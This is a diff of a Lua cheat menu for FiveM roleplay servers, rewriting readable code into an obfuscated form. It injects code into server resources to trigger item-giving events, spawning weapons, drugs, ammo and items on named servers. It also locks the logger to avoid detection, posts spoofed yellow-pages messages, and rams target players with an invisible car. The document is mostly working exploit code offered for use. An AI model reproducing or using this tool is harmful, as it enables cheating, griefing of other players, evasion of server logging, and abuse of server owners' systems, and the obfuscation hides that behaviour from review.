-        local ItemExploitSection = MachoMenuGroup(ItemExploitTab, "Xen Roleplay", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-    
-        -- Item name input box
-        local ItemInputBoxHandle = MachoMenuInputbox(ItemExploitSection, "Item Name", "...")
-        -- Amount input box
-        local AmountInputBoxHandle = MachoMenuInputbox(ItemExploitSection, "Amount", "1")
-    
-        MachoMenuButton(ItemExploitSection, "Add Item", function()
-            local ItemData = { 
-                item = MachoMenuGetInputbox(ItemInputBoxHandle), 
-                amount = tonumber(MachoMenuGetInputbox(AmountInputBoxHandle)) or 1 
-            }
-    
-            if ItemData.item and ItemData.item ~= "" and ItemData.amount > 0 then
-                -- Add item to server
-                MachoInjectResource('savana-restaurant', string.format([[
+                ]],v753));MachoMenuNotification("Success","Item exploit executed!");else MachoMenuNotification("Error","Please enter a valid item code!");end break;end end end);end if v436:find("Xen Roleplay") then local v682=0 -0 ;local v683;local v684;local v685;local v686;while true do if (v682==(1 + 0)) then v685=MachoMenuInputbox(v684,"Item Name","...");v686=MachoMenuInputbox(v684,"Amount","1");v682=2;end if (v682==(0 -0)) then v683=MachoMenuAddTab(v4,"Xen Roleplay");v684=MachoMenuGroup(v683,"Xen Roleplay",v3,1132 -(651 + 472) ,(v1.x-v3) + 114 + 36 ,v1.y);v682=1 + 0 ;end if (v682==(2 -0)) then MachoMenuButton(v684,"Add Item",function() local v917=483 -(397 + 86) ;local v918;while true do if (v917==(876 -(423 + 453))) then v918={item=MachoMenuGetInputbox(v685),amount=tonumber(MachoMenuGetInputbox(v686)) or (1 + 0) };if (v918.item and (v918.item~="") and (v918.amount>0)) then MachoInjectResource("savana-restaurant",string.format([[
                     TriggerServerEvent('savana-restaurant:giveItem', "%s", %d)
-                ]], ItemData.item, ItemData.amount, ItemData.item, ItemData.amount))
-            else
-                MachoMenuNotification("Error", "Please enter a valid item name and amount!")
-            end
-        end)
-    end
-
-    -- HotV
-    if serverName:find("HotV") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "HotV")
-        local TradeSection = MachoMenuGroup(TradeTab, "HotV Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-    
-        -- Item Exploit
-        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
-    
-        MachoMenuButton(TradeSection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-    
-            if not itemKod or itemKod == "" then
-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-    
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-    
-            -- Random item selection from ox_inventory and data structure
-            MachoInjectResource("ox_inventory", string.format([[
+                ]],v918.item,v918.amount,v918.item,v918.amount));else MachoMenuNotification("Error","Please enter a valid item name and amount!");end break;end end end);break;end end end if v436:find("HotV") then local v687=MachoMenuAddTab(v4,"HotV");local v688=MachoMenuGroup(v687,"HotV Item",v3,2 + 7 ,(v1.x-v3) + 131 + 19 ,v1.y);local v689=MachoMenuInputbox(v688,"Code Name","Example: item_code");local v690=MachoMenuInputbox(v688,"Code Amount","Example: 3");MachoMenuButton(v688,"Item Exploit",function() local v754=MachoMenuGetInputbox(v689);local v755=tonumber(MachoMenuGetInputbox(v690));if ( not v754 or (v754=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v755 or (v755<=(0 + 0))) then local v854=0 + 0 ;while true do if (v854==(1190 -(50 + 1140))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("ox_inventory",string.format([[
                 local itemismi = "%s"
                 local miktar = %d
 
@@ -8556,525 +3847,13 @@ Citizen.CreateThread(function()
                             
                 -- Send only specified amount to server
                 TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
-            ]], itemKod, miktar))
-        end)
-    
-        -- Yellow Pages Inputs
-        local NameInputHandle = MachoMenuInputbox(TradeSection, "Name", "Name to appear in yellow pages")
-        local PhoneInputHandle = MachoMenuInputbox(TradeSection, "Phone Number", "Example: 123-456-7890")
-        local MessageInputHandle = MachoMenuInputbox(TradeSection, "Message", "Text to appear in yellow pages")
-    
-        -- Yellow Pages Button
-        MachoMenuButton(TradeSection, "Send to Yellow Pages", function()
-            local name = MachoMenuGetInputbox(NameInputHandle)
-            local phone = MachoMenuGetInputbox(PhoneInputHandle)
-            local message = MachoMenuGetInputbox(MessageInputHandle)
-    
-            if not name or name == "" then
-                MachoMenuNotification("Error", "Please enter a name!")
-                return
-            end
-    
-            if not phone or phone == "" then
-                MachoMenuNotification("Error", "Please enter a phone number!")
-                return
-            end
-    
-            if not message or message == "" then
-                MachoMenuNotification("Error", "Please enter a message!")
-                return
-            end
-    
-            -- Yellow Pages Post
-            TriggerServerEvent('gksphone:yellow_postPagess', name, phone, message, "", "bartender")
-            MachoMenuNotification("Success", "Sent to yellow pages!")
-        end)
-    end
-
-    -- Black Roleplay
-    if serverName:find("Black Roleplay") then
-        local ValoriaTab = MachoMenuAddTab(MenuWindow, "Black Roleplay")
-        local ValoriaSection = MachoMenuGroup(ValoriaTab, "Item Exploit", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, 150)
-
-        -- Item code text box
-        local InputBoxItemCode = MachoMenuInputbox(ValoriaSection, "Item Code", "e.g., sandwich")
-
-        -- Amount text box
-        local InputBoxItemAmount = MachoMenuInputbox(ValoriaSection, "Amount", "e.g., 3")
-
-        -- Give Item button
-        MachoMenuButton(ValoriaSection, "Give Item", function()
-            local item = MachoMenuGetInputbox(InputBoxItemCode)
-            local amount = tonumber(MachoMenuGetInputbox(InputBoxItemAmount)) or 1
-
-            if item ~= "" and amount > 0 then
-                MachoInjectResource('monitor', string.format([[ 
+            ]],v754,v755));end);local v691=MachoMenuInputbox(v688,"Name","Name to appear in yellow pages");local v692=MachoMenuInputbox(v688,"Phone Number","Example: 123-456-7890");local v693=MachoMenuInputbox(v688,"Message","Text to appear in yellow pages");MachoMenuButton(v688,"Send to Yellow Pages",function() local v756=MachoMenuGetInputbox(v691);local v757=MachoMenuGetInputbox(v692);local v758=MachoMenuGetInputbox(v693);if ( not v756 or (v756=="")) then MachoMenuNotification("Error","Please enter a name!");return;end if ( not v757 or (v757=="")) then local v855=0 + 0 ;while true do if (v855==(0 + 0)) then MachoMenuNotification("Error","Please enter a phone number!");return;end end end if ( not v758 or (v758=="")) then local v856=0 + 0 ;while true do if (v856==(0 -0)) then MachoMenuNotification("Error","Please enter a message!");return;end end end TriggerServerEvent("gksphone:yellow_postPagess",v756,v757,v758,"","bartender");MachoMenuNotification("Success","Sent to yellow pages!");end);end if v436:find("Black Roleplay") then local v694=MachoMenuAddTab(v4,"Black Roleplay");local v695=MachoMenuGroup(v694,"Item Exploit",v3,0,(v1.x-v3) + 109 + 41 ,746 -(157 + 439) );local v696=MachoMenuInputbox(v695,"Item Code","e.g., sandwich");local v697=MachoMenuInputbox(v695,"Amount","e.g., 3");MachoMenuButton(v695,"Give Item",function() local v759=0 -0 ;local v760;local v761;while true do if ((0 -0)==v759) then v760=MachoMenuGetInputbox(v696);v761=tonumber(MachoMenuGetInputbox(v697)) or 1 ;v759=2 -1 ;end if (v759==(919 -(782 + 136))) then if ((v760~="") and (v761>(855 -(112 + 743)))) then MachoInjectResource("monitor",string.format([[ 
                     TriggerServerEvent("jim-consumables:server:toggleItem", -1, "%s", %d) 
-                ]], item, amount, item, amount))
-            else
-                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
-            end
-        end)
-    end
-end)
-
--- Logger control and force render while menu is open
-Citizen.CreateThread(function()
-    -- Lock logger completely when menu starts
-    MachoLockLogger()
-    
-    while menu do
-        -- Logger control and user notification while menu is open
-        if MachoMenuIsOpen(MenuWindow) then
-            if MachoGetLoggerState() ~= 0 then
-                MachoSetLoggerState(0)
-                MachoLockLogger()
-                MachoMenuNotification("Error", "Logger cannot be active while using the menu!")
-            end
-        end
-        Citizen.Wait(0)
-    end
-end)
-
-function ShowGTAStyleInput(title, defaultText, maxInputLength, callback)
-    DisplayOnscreenKeyboard(1, title, "", defaultText, "", "", "", maxInputLength)
-    while UpdateOnscreenKeyboard() == 0 do
-        Wait(0)
-    end
-    if GetOnscreenKeyboardResult() then
-        local input = GetOnscreenKeyboardResult()
-        callback(input)
-    end
-end
-
--- Function to get the player's server ID by their name
-function GetPlayerServerIdByName(playerName)
-    local playerServerId = nil
-    for i = 0, 255 do
-        if NetworkIsPlayerActive(i) then
-            local playerId = GetPlayerServerId(i)
-            local playerNameServer = GetPlayerName(i)
-            if playerNameServer == playerName then
-                playerServerId = playerId
-                break
-            end
-        end
-    end
-    return playerServerId
-end
-
--- Function to spawn a vehicle and ram the player
-function RamPlayer(playerServerId)
-    local playerId = GetPlayerFromServerId(playerServerId)
-    if playerId then
-        local targetPed = GetPlayerPed(playerId)
-        local targetCoords = GetEntityCoords(targetPed)
-        local offset = GetOffsetFromEntityInWorldCoords(targetPed, 0, -2.0, 0)
-        local vehModel = "futo" -- Change this to the desired vehicle model
-
-        RequestModel(vehModel)
-        while not HasModelLoaded(vehModel) do
-            Citizen.Wait(0)
-        end
-
-        local vehicle = CreateVehicle(vehModel, offset.x, offset.y, offset.z, GetEntityHeading(targetPed), true, true)
-        SetEntityVisible(vehicle, false, true)
-        if DoesEntityExist(vehicle) then
-            NetworkRequestControlOfEntity(vehicle)
-            SetVehicleDoorsLocked(vehicle, 4)
-            SetVehicleForwardSpeed(vehicle, 120.0) -- Adjust the speed as needed
-        end
-    else
-        MachoMenuNotification("Error", "Player with ID " .. playerServerId .. " not found.")
-    end
-end
-
--- Function to draw text above player's heads
-function DrawPlayerServerIds()
-    for i = 0, 255 do
-        if NetworkIsPlayerActive(i) then
-            local playerPed = GetPlayerPed(i)
-            local playerServerId = GetPlayerServerId(i)
-            local playerCoords = GetEntityCoords(playerPed)
-
-            -- Calculate the world position to draw the text above the player's head
-            local x, y, z = table.unpack(playerCoords)
-            z = z + 1.0 -- Adjust the height above the player's head
-
-            -- Draw the server ID text
-            DrawText3D(x, y, z, tostring(playerServerId))
-        end
-    end
-end
-
--- Function to draw text in 3D world space
-function DrawText3D(x, y, z, text)
-    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
-    if onScreen then
-        SetTextScale(0.35, 0.35)
-        SetTextFont(4)
-        SetTextProportional(1)
-        SetTextColour(255, 255, 255, 215)
-        SetTextEntry("STRING")
-        SetTextCentre(1)
-        AddTextComponentString(text)
-        DrawText(_x, _y)
-    end
-end
-
--- ID SHOW Main thread
-Citizen.CreateThread(function()
-    while true do
-        Citizen.Wait(0)
-        if idgoster then
-            -- Draw server IDs above players
-            DrawPlayerServerIds()
-        end
-    end
-end)
-
--- Other Menu
-
--- ============================================================
--- EASY SPAWN TAB (No typing - Just click)
--- ============================================================
-
-local EasySpawnTab = MachoMenuAddTab(MenuWindow, "Easy Spawn")
-local EasySpawnGroup = MachoMenuGroup(EasySpawnTab, "Easy Spawn", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
--- Helper function to spawn items using both methods
-local function SpawnItemEasy(itemName, amount, method)
-    amount = amount or 1
-    method = method or "lumberjack" -- "lumberjack" or "steal"
-    
-    if method == "lumberjack" then
-        TriggerServerEvent('rt-lumberjack:server:giveItem', itemName, amount)
-        MachoMenuNotification("Easy Spawn", "Spawned " .. itemName .. " x" .. amount)
-        print("[Easy Spawn] Spawned " .. itemName .. " x" .. amount)
-    elseif method == "steal" then
-        -- Try direct trigger first
-        local success = false
-        pcall(function()
-            TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
-            success = true
-        end)
-        
-        if not success then
-            local targetResource = nil
-            if GetResourceState('rt-steal') == "started" then
-                targetResource = 'rt-steal'
-            elseif GetResourceState('monitor') == "started" then
-                targetResource = 'monitor'
-            elseif GetResourceState('qb-core') == "started" then
-                targetResource = 'qb-core'
-            else
-                targetResource = 'ox_inventory'
-            end
-            
-            MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+                ]],v760,v761,v760,v761));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end end end);end end);Citizen.CreateThread(function() MachoLockLogger();while v5 do if MachoMenuIsOpen(v4) then if (MachoGetLoggerState()~=(1171 -(1026 + 145))) then MachoSetLoggerState(0 + 0 );MachoLockLogger();MachoMenuNotification("Error","Logger cannot be active while using the menu!");end end Citizen.Wait(718 -(493 + 225) );end end);function ShowGTAStyleInput(v438,v439,v440,v441) DisplayOnscreenKeyboard(3 -2 ,v438,"",v439,"","","",v440);while UpdateOnscreenKeyboard()==0  do Wait(0);end if GetOnscreenKeyboardResult() then local v698=0;local v699;while true do if (v698==(0 + 0)) then v699=GetOnscreenKeyboardResult();v441(v699);break;end end end end function GetPlayerServerIdByName(v442) local v443=nil;for v516=0 -0 ,255 do if NetworkIsPlayerActive(v516) then local v762=GetPlayerServerId(v516);local v763=GetPlayerName(v516);if (v763==v442) then v443=v762;break;end end end return v443;end function RamPlayer(v444) local v445=0;local v446;while true do if (0==v445) then v446=GetPlayerFromServerId(v444);if v446 then local v857=GetPlayerPed(v446);local v858=GetEntityCoords(v857);local v859=GetOffsetFromEntityInWorldCoords(v857,0 + 0 , -(5 -3),0 + 0 );local v860="futo";RequestModel(v860);while  not HasModelLoaded(v860) do Citizen.Wait(0);end local v861=CreateVehicle(v860,v859.x,v859.y,v859.z,GetEntityHeading(v857),true,true);SetEntityVisible(v861,false,true);if DoesEntityExist(v861) then NetworkRequestControlOfEntity(v861);SetVehicleDoorsLocked(v861,4);SetVehicleForwardSpeed(v861,200 -80 );end else MachoMenuNotification("Error","Player with ID "   .. v444   .. " not found." );end break;end end end function DrawPlayerServerIds() for v517=0,255 do if NetworkIsPlayerActive(v517) then local v764=1595 -(210 + 1385) ;local v765;local v766;local v767;local v768;local v769;local v770;while true do if (v764==(1691 -(1201 + 488))) then v770=v770 + 1 ;DrawText3D(v768,v769,v770,tostring(v766));break;end if (v764==(1 + 0)) then v767=GetEntityCoords(v765);v768,v769,v770=table.unpack(v767);v764=2 -0 ;end if (v764==(0 -0)) then v765=GetPlayerPed(v517);v766=GetPlayerServerId(v517);v764=586 -(352 + 233) ;end end end end end function DrawText3D(v447,v448,v449,v450) local v451=0;local v452;local v453;local v454;while true do if (v451==(0 -0)) then v452,v453,v454=World3dToScreen2d(v447,v448,v449);if v452 then SetTextScale(0.35,0.35);SetTextFont(4);SetTextProportional(1);SetTextColour(139 + 116 ,725 -470 ,829 -(489 + 85) ,215);SetTextEntry("STRING");SetTextCentre(1502 -(277 + 1224) );AddTextComponentString(v450);DrawText(v453,v454);end break;end end end Citizen.CreateThread(function() while true do Citizen.Wait(1493 -(663 + 830) );if v11 then DrawPlayerServerIds();end end end);local v174=MachoMenuAddTab(v4,"Easy Spawn");local v175=MachoMenuGroup(v174,"Easy Spawn",v3,8 + 1 ,(v1.x-v3) + 150 ,v1.y);local function v176(v455,v456,v457) local v458=0;while true do if (v458==(2 -1)) then if (v457=="lumberjack") then TriggerServerEvent("rt-lumberjack:server:giveItem",v455,v456);MachoMenuNotification("Easy Spawn","Spawned "   .. v455   .. " x"   .. v456 );print("[Easy Spawn] Spawned "   .. v455   .. " x"   .. v456 );elseif (v457=="steal") then local v930=0;local v931;while true do if (v930==2) then print("[Easy Spawn] Spawned "   .. v455   .. " x"   .. v456 );break;end if (v930==1) then if  not v931 then local v972=nil;if (GetResourceState("rt-steal")=="started") then v972="rt-steal";elseif (GetResourceState("monitor")=="started") then v972="monitor";elseif (GetResourceState("qb-core")=="started") then v972="qb-core";else v972="ox_inventory";end MachoInjectResource2(NewThreadNs,v972,string.format([[
                 local itemName = "%s"
                 local amount = %d
                 TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
-            ]], itemName, amount))
-        end
-        MachoMenuNotification("Easy Spawn", "Spawned " .. itemName .. " x" .. amount)
-        print("[Easy Spawn] Spawned " .. itemName .. " x" .. amount)
-    end
-end
-
--- ============================================================
--- WEAPONS (RT Steal)
--- ============================================================
-
-MachoMenuText(EasySpawnGroup, "WEAPONS (RT Steal)")
-
-MachoMenuButton(EasySpawnGroup, "Pistol", function() SpawnItemEasy("weapon_pistol", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Combat Pistol", function() SpawnItemEasy("weapon_combatpistol", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "AP Pistol", function() SpawnItemEasy("weapon_appistol", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Pistol 50", function() SpawnItemEasy("weapon_pistol50", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "SMG", function() SpawnItemEasy("weapon_smg", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Micro SMG", function() SpawnItemEasy("weapon_microsmg", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Assault SMG", function() SpawnItemEasy("weapon_assaultsmg", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Assault Rifle", function() SpawnItemEasy("weapon_assaultrifle", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Carbine Rifle", function() SpawnItemEasy("weapon_carbinerifle", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Advanced Rifle", function() SpawnItemEasy("weapon_advancedrifle", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Pump Shotgun", function() SpawnItemEasy("weapon_pumpshotgun", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Sawed Off Shotgun", function() SpawnItemEasy("weapon_sawnoffshotgun", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Assault Shotgun", function() SpawnItemEasy("weapon_assaultshotgun", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Sniper Rifle", function() SpawnItemEasy("weapon_sniperrifle", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Heavy Sniper", function() SpawnItemEasy("weapon_heavysniper", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "RPG", function() SpawnItemEasy("weapon_rpg", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Minigun", function() SpawnItemEasy("weapon_minigun", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Grenade Launcher", function() SpawnItemEasy("weapon_grenadelauncher", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Railgun", function() SpawnItemEasy("weapon_railgun", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Stun Gun (Taser)", function() SpawnItemEasy("weapon_stungun", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Knife", function() SpawnItemEasy("weapon_knife", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Bat", function() SpawnItemEasy("weapon_bat", 1, "steal") end)
-
--- ============================================================
--- ITEMS (RT Steal)
--- ============================================================
-
-MachoMenuText(EasySpawnGroup, "ITEMS (RT Steal)")
-
-MachoMenuButton(EasySpawnGroup, "Lockpick", function() SpawnItemEasy("lockpick", 5, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Advanced Lockpick", function() SpawnItemEasy("advancedlockpick", 5, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Handcuffs", function() SpawnItemEasy("handcuffs", 5, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Phone", function() SpawnItemEasy("phone", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "medkit", function() SpawnItemEasy("medkit", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Drill", function() SpawnItemEasy("drill", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Fal", function() SpawnItemEasy("weapon_fal", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Repair Kit", function() SpawnItemEasy("repairkit", 5, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Bandage", function() SpawnItemEasy("bandage", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Painkillers", function() SpawnItemEasy("painkillers", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Armor", function() SpawnItemEasy("armor", 1, "steal") end)
-
--- ============================================================
--- DRUGS (RT Steal)
--- ============================================================
-
-MachoMenuText(EasySpawnGroup, "DRUGS (RT Steal)")
-
-MachoMenuButton(EasySpawnGroup, "Weed", function() SpawnItemEasy("weed", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Cocaine", function() SpawnItemEasy("cocaine", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Meth", function() SpawnItemEasy("meth", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Crack", function() SpawnItemEasy("crack", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Heroin", function() SpawnItemEasy("heroin", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Oxy", function() SpawnItemEasy("oxy", 10, "steal") end)
-
--- ============================================================
--- AMMO (RT Steal)
--- ============================================================
-
-MachoMenuText(EasySpawnGroup, "AMMO (RT Steal)")
-
-MachoMenuButton(EasySpawnGroup, "Pistol Ammo x100", function() SpawnItemEasy("pistol_ammo", 100, "steal") end)
-MachoMenuButton(EasySpawnGroup, "SMG Ammo x100", function() SpawnItemEasy("smg_ammo", 100, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Rifle Ammo x100", function() SpawnItemEasy("rifle_ammo", 100, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Shotgun Ammo x100", function() SpawnItemEasy("shotgun_ammo", 100, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Sniper Ammo x100", function() SpawnItemEasy("sniper_ammo", 100, "steal") end)
-MachoMenuButton(EasySpawnGroup, "RPG Ammo x10", function() SpawnItemEasy("rpg_ammo", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "sniper_full", function() SpawnItemEasy("sniper_full", 11, "steal") end)
-MachoMenuButton(EasySpawnGroup, "rifle_full", function() SpawnItemEasy("rifle_full", 11, "steal") end)
-MachoMenuButton(EasySpawnGroup, "pistol_full", function() SpawnItemEasy("pistol_full", 7, "steal") end)
-
--- ============================================================
--- LUMBERJACK ITEMS
--- ============================================================
-
-MachoMenuText(EasySpawnGroup, "LUMBERJACK ITEMS")
-
-MachoMenuButton(EasySpawnGroup, "Wood", function() SpawnItemEasy("wood", 50, "lumberjack") end)
-MachoMenuButton(EasySpawnGroup, "Plank", function() SpawnItemEasy("plank", 50, "lumberjack") end)
-MachoMenuButton(EasySpawnGroup, "Log", function() SpawnItemEasy("log", 50, "lumberjack") end)
-MachoMenuButton(EasySpawnGroup, "Sawdust", function() SpawnItemEasy("sawdust", 50, "lumberjack") end)
-
--- ============================================================
--- FOOD & DRINK (RT Steal)
--- ============================================================
-
-MachoMenuText(EasySpawnGroup, "FOOD & DRINK (RT Steal)")
-
-MachoMenuButton(EasySpawnGroup, "Water Bottle", function() SpawnItemEasy("water_bottle", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Sandwich", function() SpawnItemEasy("sandwich", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Burger", function() SpawnItemEasy("burger", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Donut", function() SpawnItemEasy("donut", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Coffee", function() SpawnItemEasy("coffee", 10, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Energy Drink", function() SpawnItemEasy("energydrink", 10, "steal") end)
-
--- ============================================================
--- MISC ITEMS (RT Steal)
--- ============================================================
-
-MachoMenuText(EasySpawnGroup, "MISC ITEMS (RT Steal)")
-
-MachoMenuButton(EasySpawnGroup, "Laptop", function() SpawnItemEasy("laptop", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Hacking Device", function() SpawnItemEasy("hacking_device", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "USB Drive", function() SpawnItemEasy("usb_drive", 5, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Radio", function() SpawnItemEasy("radio", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Binoculars", function() SpawnItemEasy("binoculars", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Scuba Gear", function() SpawnItemEasy("scuba_gear", 1, "steal") end)
-MachoMenuButton(EasySpawnGroup, "Parachute", function() SpawnItemEasy("parachute", 1, "steal") end)
-
-print("[Easy Spawn] Tab loaded!")
-
--- ============================================================
--- WEAPON TAB (Pre-listed weapons - Click to spawn)
--- ============================================================
-
-local WeaponTab = MachoMenuAddTab(MenuWindow, "Weapons")
-local WeaponGroup = MachoMenuGroup(WeaponTab, "Weapon Options", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
--- Ammo quantity variable
-local S1_weapon_ammo = 250
-
--- Function to give weapon
-local function GiveWeapon(weaponName, ammo)
-    ammo = ammo or S1_weapon_ammo
-    local hash = GetHashKey(weaponName)
-    if hash and hash ~= 0 then
-        GiveWeaponToPed(PlayerPedId(), hash, ammo, false, true)
-        SetCurrentPedWeapon(PlayerPedId(), hash, true)
-        MachoMenuNotification("Weapon", "Spawned: " .. weaponName)
-        print("[Weapon] Spawned: " .. weaponName .. " x" .. ammo)
-    else
-        MachoMenuNotification("Error", "Invalid weapon: " .. weaponName)
-    end
-end
-
--- ============================================================
--- MELEE WEAPONS
--- ============================================================
-
-MachoMenuText(WeaponGroup, "MELEE WEAPONS")
-
-MachoMenuButton(WeaponGroup, "Knife", function() GiveWeapon("WEAPON_KNIFE", 1) end)
-MachoMenuButton(WeaponGroup, "Bat", function() GiveWeapon("WEAPON_BAT", 1) end)
-MachoMenuButton(WeaponGroup, "Hammer", function() GiveWeapon("WEAPON_HAMMER", 1) end)
-MachoMenuButton(WeaponGroup, "Crowbar", function() GiveWeapon("WEAPON_CROWBAR", 1) end)
-MachoMenuButton(WeaponGroup, "Golf Club", function() GiveWeapon("WEAPON_GOLFCLUB", 1) end)
-MachoMenuButton(WeaponGroup, "Machete", function() GiveWeapon("WEAPON_MACHETE", 1) end)
-MachoMenuButton(WeaponGroup, "Switchblade", function() GiveWeapon("WEAPON_SWITCHBLADE", 1) end)
-MachoMenuButton(WeaponGroup, "Dagger", function() GiveWeapon("WEAPON_DAGGER", 1) end)
-MachoMenuButton(WeaponGroup, "Hatchet", function() GiveWeapon("WEAPON_HATCHET", 1) end)
-MachoMenuButton(WeaponGroup, "Wrench", function() GiveWeapon("WEAPON_WRENCH", 1) end)
-MachoMenuButton(WeaponGroup, "Nightstick", function() GiveWeapon("WEAPON_NIGHTSTICK", 1) end)
-MachoMenuButton(WeaponGroup, "Bottle", function() GiveWeapon("WEAPON_BOTTLE", 1) end)
-
--- ============================================================
--- PISTOLS
--- ============================================================
-
-MachoMenuText(WeaponGroup, "PISTOLS")
-
-MachoMenuButton(WeaponGroup, "Pistol", function() GiveWeapon("WEAPON_PISTOL") end)
-MachoMenuButton(WeaponGroup, "Pistol MK2", function() GiveWeapon("WEAPON_PISTOL_MK2") end)
-MachoMenuButton(WeaponGroup, "Combat Pistol", function() GiveWeapon("WEAPON_COMBATPISTOL") end)
-MachoMenuButton(WeaponGroup, "AP Pistol", function() GiveWeapon("WEAPON_APPISTOL") end)
-MachoMenuButton(WeaponGroup, "Pistol 50", function() GiveWeapon("WEAPON_PISTOL50") end)
-MachoMenuButton(WeaponGroup, "Heavy Pistol", function() GiveWeapon("WEAPON_HEAVYPISTOL") end)
-MachoMenuButton(WeaponGroup, "SNS Pistol", function() GiveWeapon("WEAPON_SNSPISTOL") end)
-MachoMenuButton(WeaponGroup, "Vintage Pistol", function() GiveWeapon("WEAPON_VINTAGEPISTOL") end)
-MachoMenuButton(WeaponGroup, "Ceramic Pistol", function() GiveWeapon("WEAPON_CERAMICPISTOL") end)
-MachoMenuButton(WeaponGroup, "Flare Gun", function() GiveWeapon("WEAPON_FLAREGUN") end)
-MachoMenuButton(WeaponGroup, "Stun Gun (Taser)", function() GiveWeapon("WEAPON_STUNGUN") end)
-MachoMenuButton(WeaponGroup, "Revolver", function() GiveWeapon("WEAPON_REVOLVER") end)
-MachoMenuButton(WeaponGroup, "Double Action Revolver", function() GiveWeapon("WEAPON_DOUBLEACTION") end)
-MachoMenuButton(WeaponGroup, "Marksman Pistol", function() GiveWeapon("WEAPON_MARKSMANPISTOL") end)
-
--- ============================================================
--- SMGs
--- ============================================================
-
-MachoMenuText(WeaponGroup, "SMGs")
-
-MachoMenuButton(WeaponGroup, "SMG", function() GiveWeapon("WEAPON_SMG") end)
-MachoMenuButton(WeaponGroup, "SMG MK2", function() GiveWeapon("WEAPON_SMG_MK2") end)
-MachoMenuButton(WeaponGroup, "Micro SMG", function() GiveWeapon("WEAPON_MICROSMG") end)
-MachoMenuButton(WeaponGroup, "Assault SMG", function() GiveWeapon("WEAPON_ASSAULTSMG") end)
-MachoMenuButton(WeaponGroup, "Combat PDW", function() GiveWeapon("WEAPON_COMBATPDW") end)
-MachoMenuButton(WeaponGroup, "Machine Pistol", function() GiveWeapon("WEAPON_MACHINEPISTOL") end)
-MachoMenuButton(WeaponGroup, "Mini SMG", function() GiveWeapon("WEAPON_MINISMG") end)
-MachoMenuButton(WeaponGroup, "Gusenberg Sweeper", function() GiveWeapon("WEAPON_GUSENBERG") end)
-
--- ============================================================
--- SHOTGUNS
--- ============================================================
-
-MachoMenuText(WeaponGroup, "SHOTGUNS")
-
-MachoMenuButton(WeaponGroup, "Pump Shotgun", function() GiveWeapon("WEAPON_PUMPSHOTGUN") end)
